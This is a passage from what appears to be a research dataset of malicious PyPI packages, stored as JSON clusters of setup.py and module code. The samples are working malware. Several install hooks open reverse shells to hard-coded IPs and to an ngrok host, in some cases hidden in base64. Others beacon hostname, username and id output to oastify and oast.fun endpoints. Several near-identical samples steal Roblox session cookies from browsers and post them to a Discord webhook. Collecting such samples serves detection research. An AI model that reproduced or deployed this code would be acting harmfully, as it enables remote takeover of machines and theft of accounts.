        "code": "import base64\nimport subprocess\nimport threading\nfrom multiprocessing import Process\nimport setuptools\nfrom setuptools.command.install import install\n\ncode = '''aW1wb3J0IG9zLCBzb2NrZXQsIHN1YnByb2Nlc3MsIHRocmVhZGluZw0KZnJvbSB1cmxsaWIucGFy\nc2UgaW1wb3J0IHVybHBhcnNlDQoNCnVybCA9ICIyLnRjcC5uZ3Jvay5pbzoxNjQxOCINCmRlZiBz\nMnAocywgcCk6DQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgZGF0YSA9IHMucmVjdigxMDI0KQ0K\nICAgICAgICBpZiBsZW4oZGF0YSkgPiAwOg0KICAgICAgICAgICAgcC5zdGRpbi53cml0ZShkYXRh\nKQ0KICAgICAgICAgICAgcC5zdGRpbi5mbHVzaCgpDQoNCg0KZGVmIHAycyhzLCBwKToNCiAgICB3\naGlsZSBUcnVlOg0KICAgICAgICBzLnNlbmQocC5zdGRvdXQucmVhZCgxKSkNCg0KZGVmIGdldF9p\ncF9mcm9tX3VybCh1cmwpOg0KICAgIHBhcnNlZF91cmwgPSB1cmxwYXJzZSh1cmwpDQogICAgaG9z\ndG5hbWUgPSBwYXJzZWRfdXJsLmhvc3RuYW1lDQogICAgaXAgPSBzb2NrZXQuZ2V0aG9zdGJ5bmFt\nZShob3N0bmFtZSkNCiAgICByZXR1cm4gaXANCg0KDQpwcmludCgiY28iKQ0KcyA9IHNvY2tldC5z\nb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkNCnMuY29ubmVjdCgoIjIu\ndGNwLm5ncm9rLmlvIiwgMTY0MTgpKQ0KDQoNCnAgPSBzdWJwcm9jZXNzLlBvcGVuKFsicG93ZXJz\naGVsbCJdLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5TVERPVVQs\nIHN0ZGluPXN1YnByb2Nlc3MuUElQRSkNCg0KczJwX3RocmVhZCA9IHRocmVhZGluZy5UaHJlYWQo\ndGFyZ2V0PXMycCwgYXJncz1bcywgcF0pDQpzMnBfdGhyZWFkLmRhZW1vbiA9IFRydWUNCnMycF90\naHJlYWQuc3RhcnQoKQ0KDQpwMnNfdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9cDJz\nLCBhcmdzPVtzLCBwXSkNCnAyc190aHJlYWQuZGFlbW9uID0gVHJ1ZQ0KcDJzX3RocmVhZC5zdGFy\ndCgpDQoNCnRyeToNCiAgICBwLndhaXQoKQ0KZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAg\nIHMuY2xvc2UoKQ0K\n'''\n\n\nclass AfterInstall(install):\n\n    def run(self):\n        decoded_code = base64.b64decode(code).decode('utf-8')\n\n        command = ['python', '-c', decoded_code]\n\n        # Ex\u00e9cution en arri\u00e8re-plan sans afficher les sorties\n        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)\n\n\nsetuptools.setup(\n    name = \"EvannLeGoat\",\n    version = \"1.0.4\",\n    author = \"Malicious Actor\",\n    author_email = \"malactor@example.com\",\n    description = \"A test package to demonstrate malicious pip packages\",\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    url = \"https://github.com/teja156/autobot-clipper\",\n    project_urls = {\n        \"Bug Tracker\": \"https://github.com/teja156/autobot-clipper/issues\",\n    },\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_dir = {\"\": \"src\"},\n    packages = setuptools.find_packages(where=\"src\"),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'install': AfterInstall,\n    },\n)"
      }
    ]
  },
  {
    "cluster_id": 98,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-11-29-byted-df-v99.1.1",
        "code": "import socket\nimport urllib.request\nimport base64\nimport ssl\n\nimport inspect\n\npkg_name = inspect.currentframe().f_globals['__name__']\n\nssl_context = ssl._create_unverified_context()\n\n# Get the hostname\nhostname = socket.gethostname()\n\n# decode the URL from base64 to avoid people poking at our internal canary url\nu1 = 'aHR0cHM6Ly82'\nu2 = 'ZmRmY2NlNi4wd24uc2g='\nurl = base64.b64decode(f'{u1}{u2}').decode('utf-8') + f'?h={hostname}&pkg={pkg_name}'\n\n# Create a request object\nresponse = urllib.request.urlopen(url, context=ssl_context)\n# # Read the response content\ncontent = response.read()\n# # Print the response content (decoded)\nprint(content.decode('utf-8'))\n"
      }
    ]
  },
  {
    "cluster_id": 99,
    "size": 2,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-09-dependency-confusion12-v1.0.4",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://u3ynvyf8desx9vy4a91eslj4rvxmld92.oastify.com\",params = ploads)\n\n\nsetup(name='dependency_confusion12',\n      version='1.0.4',\n      description=\"This package is a proof of concept used by author to conduct research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on a victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. Author does not accept any liability for any direct, indirect, or consequential loss or damage arising from the use of, or reliance on, this package.\",\n      author='',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-05-09-dependency-confusion123-v1.0.4",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://u3ynvyf8desx9vy4a91eslj4rvxmld92.oastify.com\",params = ploads)\n\n\nsetup(name='dependency_confusion123',\n      version='1.0.4',\n      description=\"This package is a proof of concept used by author to conduct research. It has been uploaded for test purposes only. Its only function is to confirm the installation of the package on a victim's machines. The code is not malicious in any way and will be deleted after the research survey has been concluded. Author does not accept any liability for any direct, indirect, or consequential loss or damage arising from the use of, or reliance on, this package.\",\n      author='',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})"
      }
    ]
  },
  {
    "cluster_id": 100,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-08-30-testerpackage123-v0.1",
        "code": "\nimport base64\nexec(base64.b64decode('aW1wb3J0IHRpbWUNCg0KcHJpbnQoImhlbGxvIG1vbmtleSBib3lzIikNCnRpbWUuc2xlZXAoNSkNCg==').decode('utf-8'))\n"
      }
    ]
  },
  {
    "cluster_id": 101,
    "size": 1,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2024-03-02-vermillion-v0.5",
        "code": "from setuptools import setup, find_packages\n\nVERSION = '0.5'\nDESCRIPTION = 'Find out lol'\nLONG_DESCRIPTION = 'chicken butt https://discord.gg/ivi'\n\n# Setting up\nsetup(\n    name=\"vermillion\",\n    version=VERSION,\n    author=\"vermillion\",\n    author_email=\"vermillionalt100@gmail.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    package_data={'vermillion': ['bot.exe']},\n    entry_points={\n        'console_scripts': [\n            'vermillion = vermillion.bot:main'\n        ]\n    },\n    install_requires=['discord', 'discord_webhook'],\n    keywords=['python', 'ping'],\n    classifiers=[\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\n"
      }
    ]
  },
  {
    "cluster_id": 102,
    "size": 4,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-14-qaqaqazzz-v1.5",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport socket\nimport subprocess\nimport os\nimport base64\n\nclass PostInstallCommand(install):\n    \"\"\"Post-installation for installation mode.\"\"\"\n    def run(self):\n        install.run(self)\n        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION\n        try:\n            reverse_shell('49.233.121.53', 54)\n        except Exception as e:\n            print(\"Failed to establish connection. Continuing with installation...\")\n            print(\"Error:\", str(e))\n\ndef reverse_shell(host, port):\n    encoded_host = base64.b64decode(\"NDkuMjMzLjEyMS41Mw==\").decode('utf-8')\n    encoded_port = base64.b64decode(\"NTQ=\").decode('utf-8')\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((encoded_host, int(encoded_port)))\n        os.dup2(s.fileno(), 0)\n        os.dup2(s.fileno(), 1)\n        os.dup2(s.fileno(), 2)\n        p = subprocess.call([\"/bin/sh\", \"-i\"])\n    except Exception as e:\n        print(\"Failed to establish reverse shell. Error:\", str(e))\n\nsetup(\n    name='qaqaqazzz',\n    version='1.5',\n    author='Your Name',\n    author_email='your_email@example.com',\n    description='A malicious package for CTF challenge',\n    packages=['qaqaqazzz'],\n    install_requires=[\n        'requests',  # \u4e3e\u4f8b\uff1a\u6dfb\u52a0\u4f60\u9700\u8981\u7684\u4f9d\u8d56\u9879\n    ],\n    cmdclass={\n        'install': PostInstallCommand,\n    }\n)\n\n\n# qaqaqazzz/module1.py\n\ndef greet():\n    print(\"Hello from module1!\")\n\n\n# qaqaqazzz/__init__.py\n\n# \u5bfc\u5165\u9700\u8981\u516c\u5f00\u7684\u6a21\u5757\u3001\u51fd\u6570\u3001\u7c7b\u7b49\nfrom .module import greet\n\n# \u5b9a\u4e49\u5305\u7ea7\u522b\u7684\u5168\u5c40\u53d8\u91cf\nPACKAGE_VERSION = '1.4'\n\n# \u6267\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c\nprint(\"Initializing qaqaqazzz package...\")\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2025-01-16-pyqubee-v12.1.1",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nfrom setuptools.command.egg_info import egg_info\n\nimport json\nimport socket\nimport subprocess\nimport urllib.request\nfrom datetime import datetime\n\nINTERACT_URL = \"https://pnapggiegkfrgtgkjlscbg404dagnuism.oast.fun\"\nIDENTIFY_IP_URL = \"https://ident.me\"\n\ndef install_packages():\n    # Get host of machine\n    host = socket.gethostname()\n\n    # Try to get remote IP\n    try:\n        ip_addr = urllib.request.urlopen(IDENTIFY_IP_URL).read().decode(\"utf8\")\n    except Exception:\n        ip_addr = \"localhost\"\n\n    # Get current timestamp\n    now = datetime.now()\n    dt_string = now.strftime(\"%d/%m/%Y %H:%M:%S\")\n\n    # Get user and group information\n    os_id = subprocess.run([\"id\"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)\n\n    # Convert to json data\n    data = {\"ts\": dt_string, \"host\": f\"{host}@{ip_addr}\", \"id\": os_id.stdout}\n    json_data = json.dumps(data).encode(\"utf-8\")\n    req = urllib.request.Request(INTERACT_URL, data=json_data, headers={\"Content-Type\": \"application/json\"})\n\n    with urllib.request.urlopen(req) as response:\n        response_data = response.read()\n        print(response_data.decode())\n\n\nclass RunEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n\n\nclass RunInstallCommand(install):\n    def run(self):\n        install_packages()\n        install.run(self)\n\nsetup(\n    name=\"pyQubee\",\n    version=\"12.1.1\",\n    license=\"MIT\",\n    description=\"Raising awareness about supply chain security, not actual malware\",\n    author=\"Security Team\",\n    packages=find_packages(),\n    keywords=[\"SSCS\", \"Security\"],\n    cmdclass={\n        'install' : RunInstallCommand,\n        'egg_info': RunEggInfoCommand\n    },\n)\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-14-ctfpipshell-v0.0.4",
        "code": "from setuptools import setup, find_packages\nfrom setuptools.command.install import install\nimport subprocess,os,sys\nwith open(\"README.md\", \"r\") as readme_file:\n    readme = readme_file.read()\n\nrequirements = [\"wheel\"]\nCode = '''\nimport os\nos.system(\"bash -i >& /dev/tcp/10.3.0.95/4444 0>&1\")\n'''\n    \nclass execute(install):\n    def run(self):\n        install.run(self)\n        file = open(\"remote-access.py\", \"w\")\n        file.write(Code)\n        file.close()\n        dest = os.path.expanduser(\"~\")\n        try:\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        except FileExistsError:\n            os.remove(dest+\"/remote-access.py\")\n            os.rename(\"remote-access.py\", dest+\"/remote-access.py\")\n        try : \n            subprocess.Popen([\"python3\", dest+\"/remote-access.py\"],stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=False, text=False)\n        except:\n            pass\nsetup(\n    name=\"ctfpipshell\",\n    version=\"0.0.4\",\n    author=\"laenix\",\n    author_email=\"laenix120@gmail.com\",\n    description=\"A package to get shell in ctf\",\n    long_description=readme,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/laneix/ctf-pip-shell/\",\n    packages=find_packages(),\n    install_requires=requirements,\n    classifiers=[\n\t\"Programming Language :: Python :: 3.9\",\n\t\"License :: OSI Approved :: MIT License\",\n    ],\n)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-14-easygetflag-v1.5",
        "code": "from setuptools import setup\nfrom setuptools.command.install import install\nimport socket\nimport subprocess\nimport os\nimport base64\n\nclass PostInstallCommand(install):\n    \"\"\"Post-installation for installation mode.\"\"\"\n    def run(self):\n        install.run(self)\n        # PUT YOUR POST-INSTALL SCRIPT HERE or CALL A FUNCTION\n        try:\n            reverse_shell('49.233.121.53', 54)\n        except Exception as e:\n            print(\"Failed to establish connection. Continuing with installation...\")\n            print(\"Error:\", str(e))\n\ndef reverse_shell(host, port):\n    encoded_host = base64.b64decode(\"NDkuMjMzLjEyMS41Mw==\").decode('utf-8')\n    encoded_port = base64.b64decode(\"NTQ=\").decode('utf-8')\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.connect((encoded_host, int(encoded_port)))\n        os.dup2(s.fileno(), 0)\n        os.dup2(s.fileno(), 1)\n        os.dup2(s.fileno(), 2)\n        p = subprocess.call([\"/bin/sh\", \"-i\"])\n    except Exception as e:\n        print(\"Failed to establish reverse shell. Error:\", str(e))\n\nsetup(\n    name='easygetflag',\n    version='1.5',\n    author='Your Name',\n    author_email='your_email@example.com',\n    description='A malicious package for CTF challenge',\n    packages=['easygetflag'],\n    install_requires=[\n        'requests',  # \u4e3e\u4f8b\uff1a\u6dfb\u52a0\u4f60\u9700\u8981\u7684\u4f9d\u8d56\u9879\n    ],\n    cmdclass={\n        'install': PostInstallCommand,\n    }\n)\n\n\n# easygetflag/module1.py\n\ndef greet():\n    print(\"Hello from module1!\")\n\n\n# easygetflag/__init__.py\n\n# \u5bfc\u5165\u9700\u8981\u516c\u5f00\u7684\u6a21\u5757\u3001\u51fd\u6570\u3001\u7c7b\u7b49\nfrom .module import greet\n\n# \u5b9a\u4e49\u5305\u7ea7\u522b\u7684\u5168\u5c40\u53d8\u91cf\nPACKAGE_VERSION = '1.4'\n\n# \u6267\u884c\u4e00\u4e9b\u521d\u59cb\u5316\u64cd\u4f5c\nprint(\"Initializing easygetflag package...\")\n"
      }
    ]
  },
  {
    "cluster_id": 103,
    "size": 6,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolocyawkmylds",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolocyawkmylds', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='<Message id=1038463738161926254 channel=<DMChannel id=1038462724411240448 recipient=None> type=<MessageType.default: 0> author=<User id=965607288083718154 name='\\u1cbc\\u1cbc\\u1cbc' discriminator='4942' bot=False> flags=<MessageFlags value=0>>' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolodqijhnjgte",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolodqijhnjgte', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='<Message id=1038462796544884816 channel=<DMChannel id=1038462724411240448 recipient=None> type=<MessageType.default: 0> author=<User id=965607288083718154 name='\\u1cbc\\u1cbc\\u1cbc' discriminator='4942' bot=False> flags=<MessageFlags value=0>>' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolohnetekcjdz",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolohnetekcjdz', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='<Message id=1038463352323719268 channel=<DMChannel id=1038462724411240448 recipient=None> type=<MessageType.default: 0> author=<User id=965607288083718154 name='\\u1cbc\\u1cbc\\u1cbc' discriminator='4942' bot=False> flags=<MessageFlags value=0>>' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is expired\\ndead cookie :skull: : ```{roblox_cookie}```\"})\n    exit()\n\n#################### getting info about the cookie #############\nebruh = requests.get(\"https://www.roblox.com/mobileapi/userinfo\",cookies={\".ROBLOSECURITY\":roblox_cookie})\ninfo = json.loads(ebruh.text)\nrid = info[\"UserID\"]\nrap = robloxpy.User.External.GetRAP(rid)\nfriends = robloxpy.User.Friends.External.GetCount(rid)\nage = robloxpy.User.External.GetAge(rid)\ncrdate = robloxpy.User.External.CreationDate(rid)\nrolimons = f\"https://www.rolimons.com/player/{rid}\"\nroblox_profile = f\"https://web.roblox.com/users/{rid}/profile\"\nheadshot = robloxpy.User.External.GetHeadshot(rid)\nusername = info['UserName']\nrobux = info['RobuxBalance']\npremium = info['IsPremium']\n\na=requests.post(webhookk, data={'content': f'[Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile}) \\nRobux Balance: {robux} \\nCreation Date: {crdate} \\nRAP: {rap} \\nFriends: {friends} \\nAccount Age: {age} \\nIP Adress: {ip_address} \\n.ROBLOSECURITY: ```{roblox_cookie}``` Thanks for using the top grabber :))'})\nprint(a.text)"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2022-11-08-xolomdabxhhrue",
        "code": "from setuptools import setup, find_packages\n# :)\nVERSION = '1.0.0'\n\n# Setting up\nsetup(\n    name='xolomdabxhhrue', \n    author=\"\",\n    author_email=\"\",\n    packages=find_packages(),\n    install_requires=[\"browser_cookie3\", \"discordwebhook\", \"robloxpy\", \"requests\"],\n)\n\n###REMOVED DUALHOOK###\n\nimport os\nimport codecs\nimport json\nimport robloxpy\nimport requests,re\nfrom discordwebhook import *\nimport browser_cookie3\nwebhookk='<Message id=1038463549611180131 channel=<DMChannel id=1038462724411240448 recipient=None> type=<MessageType.default: 0> author=<User id=965607288083718154 name='\\u1cbc\\u1cbc\\u1cbc' discriminator='4942' bot=False> flags=<MessageFlags value=0>>' \n\ndef command(c):\n    os.system(c)\ndef cls():\n    os.system(\"cls\")\n\n\n\n\ndummy_message = \"Loading...\" # A message that distracts the user from closing the grabber\nprint(dummy_message)\n################### Gathering INFOMATION #################################\ndef cookieLogger():\n\n    data = [] # data[0] == All Cookies (Used For Requests) // data[1] == .ROBLOSECURITY Cookie (Used For Logging In To The Account)\n\n    try:\n        cookies = browser_cookie3.firefox(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n    try:\n        cookies = browser_cookie3.chromium(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.edge(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.opera(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n    try:\n        cookies = browser_cookie3.chrome(domain_name='roblox.com')\n        for cookie in cookies:\n            if cookie.name == '.ROBLOSECURITY':\n                data.append(cookies)\n                data.append(cookie.value)\n                return data\n    except:\n        pass\n\n\ncookies = cookieLogger()\n\n\n#################### INFOMATION #################\nip_address = requests.get(\"https://api.ipify.org/\").text\nroblox_cookie = cookies[1]\n#################### checking cookie #############\nisvalid = robloxpy.Utils.CheckCookie(roblox_cookie)\nif isvalid == \"Valid Cookie\":\n    pass\nelse:\n    requests.post(url=webhookk,data={\"content\":f\"R.I.P ,cookie is 